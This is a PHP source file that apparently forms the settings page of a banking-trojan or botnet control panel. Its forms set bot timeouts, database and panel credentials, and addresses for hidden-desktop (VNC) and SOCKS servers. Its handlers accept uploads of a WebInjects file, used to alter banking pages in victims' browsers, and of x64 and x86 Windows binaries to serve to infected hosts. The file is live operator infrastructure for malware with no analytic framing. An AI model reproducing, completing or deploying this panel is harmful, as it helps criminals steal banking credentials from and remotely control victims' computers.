<?php
require_once('inc/common.php');
if(isset($_GET['injects']))
{
   set_headers_txt();
   echo(file_get_contents($CONST_INJECTS_PATH));
   exit();
}

ui_start('Settings');
ui_content_start();

function echo_settings_updated_info()
{
   echo('<div class="info">Settings updated</div>');
}

function write_settings()
{
   global 
      $CONF_TIMEOUT_OFFLINE,
      $CONF_TIMEOUT_DEAD,
      $CONF_DB_HOST,
      $CONF_DB_NAME,
      $CONF_DB_USER,
      $CONF_DB_PASS,
      $CONF_SERVER_HIDDEN_DESKTOP,
      $CONF_SERVER_SOCKS,
      $CONF_PANEL_USER,
      $CONF_PANEL_PASS;
   file_put_contents
   (
      'settings_data.php', 
      '<?php'.PHP_EOL.
      '$CONF_TIMEOUT_OFFLINE               = '.$CONF_TIMEOUT_OFFLINE.';'.PHP_EOL.
      '$CONF_TIMEOUT_DEAD                  = '.$CONF_TIMEOUT_DEAD.';'.PHP_EOL.
      '$CONF_DB_HOST                       = "'.escape_php_string($CONF_DB_HOST).'";'.PHP_EOL.
      '$CONF_DB_NAME                       = "'.escape_php_string($CONF_DB_NAME).'";'.PHP_EOL.
      '$CONF_DB_USER                       = "'.escape_php_string($CONF_DB_USER).'";'.PHP_EOL.
      '$CONF_DB_PASS                       = "'.escape_php_string($CONF_DB_PASS).'";'.PHP_EOL.
      '$CONF_SERVER_HIDDEN_DESKTOP         = "'.escape_php_string($CONF_SERVER_HIDDEN_DESKTOP).'";'.PHP_EOL.
      '$CONF_SERVER_SOCKS                  = "'.escape_php_string($CONF_SERVER_SOCKS).'";'.PHP_EOL.
      '$CONF_PANEL_USER                    = "'.escape_php_string($CONF_PANEL_USER).'";'.PHP_EOL.
      '$CONF_PANEL_PASS                    = "'.escape_php_string($CONF_PANEL_PASS).'";'.PHP_EOL.
      '?>'
   );
   echo_settings_updated_info();
}

if(isset($_POST['timeout_offline']))
{
   action_sec_check();
   if(!ctype_digit($_POST['timeout_offline']) || !ctype_digit($_POST['timeout_dead']))
      echo('<div class="error">Invalid timeout value</div>');
   else
   {
      $CONF_TIMEOUT_OFFLINE = $_POST['timeout_offline'];
      $CONF_TIMEOUT_DEAD    = $_POST['timeout_dead'];
      write_settings();
   }
}
else if(isset($_POST['db_name']))
{
   action_sec_check();
   $CONF_DB_HOST = $_POST['db_host'];
   $CONF_DB_NAME = $_POST['db_name'];
   $CONF_DB_USER = $_POST['db_user'];
   $CONF_DB_PASS = $_POST['db_pass'];
   write_settings();
}
else if(isset($_POST['server_hidden_desktop']))
{
   action_sec_check();
   $CONF_SERVER_HIDDEN_DESKTOP = $_POST['server_hidden_desktop'];
   $CONF_SERVER_SOCKS          = $_POST['server_socks'];
   write_settings();
}
else if(isset($_POST['pass']))
{
   action_sec_check();
   if($_POST['pass'] === $_POST['pass2'])
   {
      $minChars = 4;
      if(strlen($_POST['pass']) >= $minChars && strlen($_POST['user']) >= $minChars)
      {
         $CONF_PANEL_USER = $_POST['user'];
         $CONF_PANEL_PASS = hash_pass($_POST['pass']);
         write_settings();
      }
      else
         echo('<div class="error">User and password must be at least '.$minChars.' characters long</div>');
   }
   else
      echo('<div class="error">Passwords are not the same</div>');
}
else if(isset($_FILES['injects_file']))
{
   action_sec_check();
   if($_FILES['injects_file']['error'] != UPLOAD_ERR_OK)
      echo_file_upload_error();
   else
   {
      $json = file_get_contents($_FILES['injects_file']['tmp_name']);
      json_decode($json);
      if(json_last_error() != JSON_ERROR_NONE)
         echo('<div class="error">Json is invalid</div>');
      else
      {
         move_uploaded_file($_FILES['injects_file']['tmp_name'], $CONST_INJECTS_PATH);
         echo_settings_updated_info();
      }
   }
}
else if(isset($_FILES['x64_bin']))
{
   action_sec_check();
   function is_valid_pe($file)
   {
      $contents = file_get_contents($file['tmp_name']);
      $size     = $file['size'];
      if($size < 1024)
         return false;
      if($contents[0] != 'M' || $contents[1] != 'Z')
         return false;
      return true;
   }
   if($_FILES['x64_bin']['error'] != UPLOAD_ERR_OK || $_FILES['x86_bin']['error'] != UPLOAD_ERR_OK)
      echo_file_upload_error();
   else if(is_valid_pe($_FILES['x64_bin']) && is_valid_pe($_FILES['x86_bin']))
   {
      move_uploaded_file($_FILES['x64_bin']['tmp_name'], $CONST_X64_BIN_PATH);
      move_uploaded_file($_FILES['x86_bin']['tmp_name'], $CONST_X86_BIN_PATH);
      echo_settings_updated_info();
   }
   else
      echo('<div class="error">Invalid PE file</div>');
}
?>
<style>
.content
{
   text-align: center;
   font-size: 0;
}

.box
{
   width: 500px;
   font-size: 12px;
}

.left
{
   text-align: left;
   display: inline-block;
   vertical-align:top;
}

.error, .info
{
   margin-bottom: 10px;
}
</style>
<div class="left" style="margin-right: 10px;">
  <form class="box margin-bottom" method="POST">
    <div>Update Timeouts (Seconds)</div>
    <input type="hidden" name="time" value="<?php echo($_SESSION['time']); ?>">
    <table>
      <tr><td>Offline</td><td><input type="text" name="timeout_offline" class="input" value="<?php echo $CONF_TIMEOUT_OFFLINE; ?>"></td></tr>
      <tr><td>Dead</td><td><input type="text" name="timeout_dead" class="input" value="<?php echo $CONF_TIMEOUT_DEAD; ?>"></td></tr>
      <tr><td></td><td><input type="submit" class="btn" value="Update"></td></tr>
    </table>
  </form>
  <form class="box margin-bottom" method="POST">
    <div>Update Database Credentials</div>
    <input type="hidden" name="time" value="<?php echo($_SESSION['time']); ?>">
    <table>
      <tr><td>Host</td><td><input type="text" name="db_host" class="input" value="<?php echo $CONF_DB_HOST; ?>"></td></tr>
      <tr><td>Name</td><td><input type="text" name="db_name" class="input" value="<?php echo $CONF_DB_NAME; ?>"></td></tr>
      <tr><td>User</td><td><input type="text" name="db_user" class="input" value="<?php echo $CONF_DB_USER; ?>"></td></tr>
      <tr><td>Password</td><td><input type="password" name="db_pass"  class="input"></td></tr>
      <tr><td></td><td><input type="submit" class="btn" value="Update"></td></tr>
    </table>
  </form>
  <form class="box" method="POST">
    <div>Update Server Addresses</div>
    <input type="hidden" name="time" value="<?php echo($_SESSION['time']); ?>">
    <table>
      <tr><td>VNC</td><td><input type="text" name="server_hidden_desktop" class="input" value="<?php echo $CONF_SERVER_HIDDEN_DESKTOP; ?>"></td></tr>
      <tr><td>SOCKS</td><td><input type="text" name="server_socks" class="input" value="<?php echo $CONF_SERVER_SOCKS; ?>"></td></tr>
      <tr><td></td><td><input type="submit" class="btn" value="Update"></td></tr>
    </table>
  </form>
</div>
<div class="left">
  <form class="box margin-bottom" method="POST">
    <div>Update Panel Credentials</div>
    <input type="hidden" name="time" value="<?php echo($_SESSION['time']); ?>">
    <table>
      <tr><td>User</td><td><input type="text" name="user" class="input" value="<?php echo $CONF_PANEL_USER; ?>"></td></tr>
      <tr><td>Password</td><td><input type="password" name="pass" class="input"></td></tr>
      <tr><td>Password Verification</td><td><input type="password" name="pass2" class="input"></td></tr>
      <tr><td></td><td><input type="submit" class="btn" value="Update"></td></tr>
    </table>
  </form>
  <form class="box margin-bottom" method="POST" enctype="multipart/form-data">
    <div>Upload WebInjects</div>
    <input type="hidden" name="time" value="<?php echo($_SESSION['time']); ?>">
    <table>
      <tr><td>File</td><td><input type="file" name="injects_file"></td><td nowrap><a href="?injects" class="btn" target="_blank">View Current WebInjects</a></td></tr>
      <tr><td></td><td><input type="submit" class="btn" value="Upload"></td></tr>
    </table>
  </form>
  <form class="box" method="POST" enctype="multipart/form-data">
    <div>Upload Binaries</div>
    <input type="hidden" name="time" value="<?php echo($_SESSION['time']); ?>">
    <table>
      <tr><td>x64</td><td><input type="file" name="x64_bin"></td></tr>
      <tr><td>x86</td><td><input type="file" name="x86_bin"></td></tr>
      <tr><td></td><td><input type="submit" class="btn" value="Upload"></td></tr>
    </table>
  </form>
</div>
<?php
ui_content_end();
ui_end();
?>